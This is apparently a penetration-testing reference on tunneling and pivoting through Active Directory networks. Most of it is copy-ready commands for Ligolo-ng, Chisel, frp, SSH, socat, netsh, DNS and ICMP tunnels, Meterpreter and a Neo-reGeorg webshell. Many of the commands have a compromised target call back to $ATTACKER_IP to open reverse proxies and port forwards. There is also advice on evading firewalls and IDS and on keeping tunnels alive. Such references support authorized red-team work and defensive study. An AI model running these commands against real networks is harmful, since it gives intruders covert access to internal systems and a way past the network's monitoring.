# Tunneling & Pivoting Reference

Comprehensive command reference for establishing network tunnels and pivots during AD pentest operations.

## Decision Tree

```
┌─ Have direct TCP to target?
│  └─ YES → Ligolo-ng (TUN-based, RECOMMENDED) or Chisel (SOCKS5)
│
┌─ Only HTTP/HTTPS egress?
│  └─ YES → Chisel over HTTP, Neo-reGeorg, or frp with HTTP proxy
│
┌─ Only DNS egress?
│  └─ YES → dnscat2 or iodine
│
┌─ Only ICMP egress?
│  └─ YES → ptunnel-ng
│
┌─ Windows host, no tools uploadable?
│  └─ YES → netsh portproxy + SSH (if available)
│
┌─ Need multi-hop pivot?
│  └─ YES → Ligolo-ng double pivot or SSH ProxyJump
│
└─ Behind corporate proxy?
   └─ YES → Chisel with --proxy flag or frp with HTTP CONNECT
```

## Tool Comparison Table

| Tool | Protocol | Stealth | Speed | Multi-hop | Platform | Notes |
|------|----------|---------|-------|-----------|----------|-------|
| **Ligolo-ng** | TCP/TUN | Medium | Fast | Yes | Win/Lin | Best for full subnet access |
| **Chisel** | TCP/HTTP/SOCKS5 | Medium | Fast | Yes | Win/Lin | Best all-rounder |
| **frp** | TCP/UDP/HTTP | Medium | Fast | Yes | Win/Lin | Best for complex NAT |
| **SSH** | TCP/SOCKS | High | Medium | Yes | Lin/Win10+ | Native on Linux |
| **socat** | TCP/UDP | High | Fast | No | Lin/Win | Low-level relay |
| **netsh** | TCP | High | Medium | No | Windows | Built-in, no upload |
| **dnscat2** | DNS | Very High | Slow | Yes | Win/Lin | Restricted egress |
| **iodine** | DNS | Very High | Slow | No | Lin | Restricted egress |
| **ptunnel-ng** | ICMP | Very High | Slow | No | Lin | Restricted egress |
| **Meterpreter** | TCP | Low | Medium | Yes | Win/Lin | Post-exploitation |
| **Neo-reGeorg** | HTTP/HTTPS | High | Medium | No | Any (webshell) | Via compromised web app |

## Ligolo-ng (RECOMMENDED)

**Use case**: Best general-purpose pivot tool. Creates TUN interface for transparent routing.

### Setup Proxy (Attacker)

```bash
# Start ligolo-ng proxy with self-signed cert
sudo ip tuntap add user $USER mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert -laddr 0.0.0.0:11601
```

### Deploy Agent (Target)

```bash
# Linux agent
./agent -connect $ATTACKER_IP:11601 -ignore-cert

# Windows agent
agent.exe -connect $ATTACKER_IP:11601 -ignore-cert
```

### Configure Routes (Attacker)

```bash
# In ligolo-ng proxy session
ligolo-ng » session
ligolo-ng » ifconfig  # Show agent's network interfaces
ligolo-ng » start     # Start tunnel

# Add route for target subnet (outside ligolo-ng)
sudo ip route add 10.10.10.0/24 dev ligolo
```

### Double Pivot (Multi-hop)

```bash
# Agent1 (DMZ host) connects to proxy
# Agent2 (internal host) connects through Agent1

# On Agent1 (DMZ):
./agent -connect $ATTACKER_IP:11601 -ignore-cert -bind 0.0.0.0:11602

# On Agent2 (internal):
./agent -connect $AGENT1_IP:11602 -ignore-cert

# On attacker:
sudo ip route add 192.168.100.0/24 dev ligolo  # Internal subnet via Agent2
```

## Chisel

**Use case**: SOCKS5 proxy, reverse port forwarding, HTTP tunneling.

### Reverse SOCKS5 (Most Common)

```bash
# Server (attacker)
./chisel server -p 8000 --reverse --socks5

# Client (target)
./chisel client $ATTACKER_IP:8000 R:socks
# Creates SOCKS5 proxy on attacker at 127.0.0.1:1080
```

### Reverse Port Forward

```bash
# Server (attacker)
./chisel server -p 8000 --reverse

# Client (target) - forward target's RDP to attacker
./chisel client $ATTACKER_IP:8000 R:3389:127.0.0.1:3389
# Access via: rdesktop 127.0.0.1:3389 on attacker
```

### Forward SOCKS5

```bash
# Server (target)
./chisel server -p 8000 --socks5

# Client (attacker)
./chisel client $TARGET_IP:8000 socks
# Creates SOCKS5 proxy on attacker at 127.0.0.1:1080
```

### HTTP Tunneling Through Corporate Proxy

```bash
# Client (target, behind corporate proxy)
./chisel client --proxy http://proxy.corp.com:8080 $ATTACKER_IP:443 R:socks

# Server (attacker, listening on 443)
./chisel server -p 443 --reverse --socks5
```

## frp (Fast Reverse Proxy)

**Use case**: Complex NAT traversal, UDP forwarding, range port forwarding.

### Setup Server (Attacker)

```ini
# frps.ini
[common]
bind_port = 7000
token = YOUR_SECURE_TOKEN
```

```bash
./frps -c frps.ini
```

### SOCKS5 Proxy (Client → Target)

```ini
# frpc.ini (on target)
[common]
server_addr = $ATTACKER_IP
server_port = 7000
token = YOUR_SECURE_TOKEN

[socks5]
type = tcp
remote_port = 1080
plugin = socks5
```

```bash
./frpc -c frpc.ini
# Access via SOCKS5 at $ATTACKER_IP:1080
```

### TCP Port Forward (RDP Example)

```ini
# frpc.ini (on target)
[common]
server_addr = $ATTACKER_IP
server_port = 7000
token = YOUR_SECURE_TOKEN

[rdp]
type = tcp
local_ip = 127.0.0.1
local_port = 3389
remote_port = 13389
```

```bash
# Access RDP at $ATTACKER_IP:13389
rdesktop $ATTACKER_IP:13389
```

## SSH Tunneling

**Use case**: Native on Linux, built-in on Windows 10+.

### Local Port Forward (-L)

```bash
# Forward attacker's local 8080 to target's 10.10.10.5:80
ssh -L 8080:10.10.10.5:80 user@$JUMPHOST_IP
# Access via: curl http://127.0.0.1:8080
```

### Remote Port Forward (-R)

```bash
# Forward target's service back to attacker
ssh -R 8080:127.0.0.1:80 user@$ATTACKER_IP
# Attacker accesses target's port 80 via localhost:8080
```

### Dynamic SOCKS Proxy (-D)

```bash
# Create SOCKS5 proxy on attacker
ssh -D 1080 user@$JUMPHOST_IP
# Configure apps to use SOCKS5 127.0.0.1:1080
```

### ProxyJump (Multi-hop)

```bash
# Jump through DMZ to reach internal host
ssh -J user@$DMZ_IP user@$INTERNAL_IP

# With port forward through jump
ssh -J user@$DMZ_IP -L 3389:$TARGET_IP:3389 user@$INTERNAL_IP
```

### sshuttle (VPN-like)

```bash
# Route entire subnet through SSH
sshuttle -r user@$JUMPHOST_IP 10.10.10.0/24

# With DNS
sshuttle -r user@$JUMPHOST_IP 10.10.10.0/24 --dns
```

## socat

**Use case**: Low-level TCP/UDP relay, encrypted forwarding.

### TCP Port Relay

```bash
# Forward local 8080 to target's 10.10.10.5:80
socat TCP-LISTEN:8080,fork TCP:10.10.10.5:80
```

### Encrypted Relay (SSL)

```bash
# Generate cert
openssl req -newkey rsa:2048 -nodes -keyout relay.key -x509 -days 365 -out relay.crt
cat relay.key relay.crt > relay.pem

# Server (attacker)
socat OPENSSL-LISTEN:4443,cert=relay.pem,verify=0,fork TCP:127.0.0.1:22

# Client (target)
socat TCP-LISTEN:2222,fork OPENSSL:$ATTACKER_IP:4443,verify=0
```

### UDP Relay

```bash
socat UDP-LISTEN:53,fork UDP:8.8.8.8:53
```

## netsh (Windows Native)

**Use case**: No tools needed, built into Windows.

### Port Proxy

```cmd
REM Forward local 8080 to 10.10.10.5:80
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=10.10.10.5

REM View rules
netsh interface portproxy show all

REM Delete rule
netsh interface portproxy delete v4tov4 listenport=8080 listenaddress=0.0.0.0
```

### Firewall Rules

```cmd
REM Allow inbound 8080
netsh advfirewall firewall add rule name="Port 8080" dir=in action=allow protocol=TCP localport=8080

REM Delete rule
netsh advfirewall firewall delete rule name="Port 8080"
```

## DNS Tunneling

**Use case**: Only DNS egress allowed (port 53).

### dnscat2

```bash
# Server (attacker, authoritative for tunnel.example.com)
dnscat2-server tunnel.example.com

# Client (target)
./dnscat tunnel.example.com

# In dnscat2 console
dnscat2> session -i 1
dnscat2> listen 127.0.0.1:8080 10.10.10.5:80  # Port forward
```

### iodine

```bash
# Server (attacker, authoritative for t.example.com)
sudo iodined -f -c -P PASSWORD 10.0.0.1 t.example.com

# Client (target)
sudo iodine -f -P PASSWORD $ATTACKER_IP t.example.com
# Creates tun interface, assign 10.0.0.2, route through 10.0.0.1
```

## ICMP Tunneling

**Use case**: Only ICMP egress allowed.

### ptunnel-ng

```bash
# Server (attacker)
sudo ptunnel-ng -p $ATTACKER_IP

# Client (target) - forward local 2222 to attacker's 22 via ICMP
sudo ptunnel-ng -p $ATTACKER_IP -lp 2222 -da $ATTACKER_IP -dp 22

# Use tunnel
ssh -p 2222 user@127.0.0.1
```

## Meterpreter Pivoting

**Use case**: Post-exploitation via Metasploit.

### autoroute

```bash
# Add route through session 1
meterpreter> run autoroute -s 10.10.10.0/24
# Or
meterpreter> run post/multi/manage/autoroute SUBNET=10.10.10.0 NETMASK=255.255.255.0

# Use with auxiliary modules
msf> use auxiliary/scanner/portscan/tcp
msf> set RHOSTS 10.10.10.0/24
msf> run
```

### Port Forward

```bash
# Forward attacker's 1234 to target's 10.10.10.5:3389
meterpreter> portfwd add -l 1234 -p 3389 -r 10.10.10.5
meterpreter> portfwd list
```

### SOCKS Proxy Module

```bash
# In meterpreter session
meterpreter> background

# Load socks proxy
msf> use auxiliary/server/socks_proxy
msf> set SRVPORT 1080
msf> set VERSION 5
msf> run -j

# Verify
msf> jobs
```

## Neo-reGeorg

**Use case**: Pivot through compromised web application via webshell.

### Deploy

```bash
# Upload tunnel script (choose based on web tech)
# - tunnel.aspx (ASP.NET)
# - tunnel.jsp (Java)
# - tunnel.php (PHP)
# - tunnel.py (Python)

# Start client
python3 neoreg.py -k PASSWORD -u http://$TARGET_IP/uploads/tunnel.php

# Creates SOCKS5 proxy at 127.0.0.1:1080
```

## Proxychains Integration

### Configuration

```bash
# Edit /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080

# Dynamic chain (tries all proxies, skips dead ones)
dynamic_chain

# Strict chain (all proxies must work)
# strict_chain
```

### Usage

```bash
# Run any tool through SOCKS5
proxychains4 nmap -sT -Pn 10.10.10.5
proxychains4 crackmapexec smb 10.10.10.0/24 -u user -p pass
proxychains4 curl http://10.10.10.5

# Quiet mode
proxychains4 -q nmap -sT -Pn 10.10.10.5
```

### Multi-hop Chain

```ini
# /etc/proxychains4.conf
[ProxyList]
socks5 127.0.0.1 1080   # First pivot
socks5 127.0.0.1 1081   # Second pivot
```

## Operational Notes

### Port Selection

| Port | Service | Notes |
|------|---------|-------|
| **443** | HTTPS | Most likely allowed outbound |
| **80** | HTTP | Often allowed, less suspicious |
| **53** | DNS | Universal, rarely blocked |
| **22** | SSH | Common in Linux environments |
| **8080** | HTTP-Proxy | Common proxy port |
| **3128** | Squid | Corporate proxy alternative |

### Firewall Evasion

```bash
# Use common ports
chisel server -p 443 --reverse

# Wrap in TLS
stunnel or socat SSL wrapper

# Fragment packets (where applicable)
# DNS/ICMP tunnels naturally fragment

# Rate limiting (avoid IDS triggers)
# Slow down tunnel traffic if needed
```

### DNS Considerations

For DNS tunneling to work:

1. **Attacker must control authoritative NS** for domain (e.g., tunnel.example.com)
2. **NS record** must point to attacker's IP
3. **Target's DNS** must recurse to attacker's NS
4. **Test first**: `nslookup test.tunnel.example.com` from target

### Performance vs Stealth

| Priority | Tool Choice |
|----------|-------------|
| **Speed** | Ligolo-ng, Chisel, frp |
| **Stealth** | SSH, DNS (dnscat2), ICMP (ptunnel-ng) |
| **Compatibility** | netsh (Windows), SSH (Linux) |
| **Simplicity** | Chisel (single binary) |

### Multi-hop Strategy

```
Attacker ──→ DMZ Host ──→ Internal Host ──→ Isolated Network
         (Ligolo)      (Chisel)         (SSH)

# Use different tools per hop to avoid single point of failure
# Ligolo for DMZ (fast, TUN-based)
# Chisel for internal (SOCKS5, flexible)
# SSH for final hop (native, stealthy)
```

### Debugging

```bash
# Test SOCKS proxy
curl --socks5 127.0.0.1:1080 http://10.10.10.5

# Test SSH tunnel
ssh -v -D 1080 user@host  # Verbose output

# Verify routes (Ligolo-ng)
ip route show
ping -c 1 10.10.10.5

# Check listening ports
ss -tlnp | grep <port>
netstat -an | findstr <port>  # Windows
```

### Persistence Considerations

```bash
# Screen/tmux for SSH tunnels
screen -dmS tunnel ssh -D 1080 user@host

# Systemd service for Chisel (Linux)
# Windows service wrapper for agents

# Cron for auto-reconnect (not covered here, see persistence.md)
```

---

**Key Principles**:
- **Start with Ligolo-ng or Chisel** (most versatile)
- **Match protocol to egress restrictions** (HTTP → Chisel/frp, DNS → dnscat2)
- **Use native tools when possible** (SSH on Linux, netsh on Windows)
- **Test connectivity before pivoting** (ping, curl through SOCKS)
- **Layer tunnels for multi-hop** (different tool per hop)
- **Prefer port 443/80** (blend with normal traffic)
